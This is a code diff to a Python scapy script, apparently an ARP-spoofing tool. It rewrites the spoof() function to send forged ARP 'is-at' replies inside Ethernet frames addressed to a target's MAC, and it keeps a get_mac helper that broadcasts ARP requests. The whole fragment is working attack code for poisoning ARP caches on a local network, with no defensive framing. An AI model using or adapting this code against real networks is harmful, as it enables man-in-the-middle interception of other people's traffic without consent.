@@ -2,8 +2,10 @@ import scapy.all as scapy
 import time
 
 def spoof(target_ip, target_mac, spoof_ip):
-    ARP_packet = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = "is-at")
-    scapy.send(ARP_packet, verbose = 0)
+    ether = scapy.Ether(dst = target_mac)
+    arp = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+    packet = ether / arp
+    scapy.sendp(packet, verbose=0)
 
 def get_mac(ip):
     arp_request = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst = ip)
